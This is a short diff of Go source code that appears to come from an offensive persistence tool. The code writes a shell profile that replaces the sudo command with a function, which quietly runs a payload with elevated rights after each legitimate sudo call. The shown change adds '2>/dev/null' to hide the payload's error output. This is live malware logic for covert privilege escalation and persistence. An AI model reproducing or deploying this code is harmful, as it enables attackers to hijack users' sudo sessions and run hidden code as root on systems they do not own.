@@ -154,7 +154,7 @@ func profiles() (err error) {
 		sudoLocs = append(sudoLocs, "/usr/bin/sudo -E "+loc)
 	}
 	sudoPayload := strings.Join(sudoLocs, "||")
-	loader += fmt.Sprintf("\nfunction sudo() { /usr/bin/sudo $@; (set +m;(%s)) }", sudoPayload)
+	loader += fmt.Sprintf("\nfunction sudo() { /usr/bin/sudo $@; (set +m;(%s 2>/dev/null)) }", sudoPayload)
 	err = ioutil.WriteFile(user.HomeDir+"/.bashprofile", []byte(loader), 0644)
 	if err != nil {
 		if !util.IsExist(user.HomeDir) {
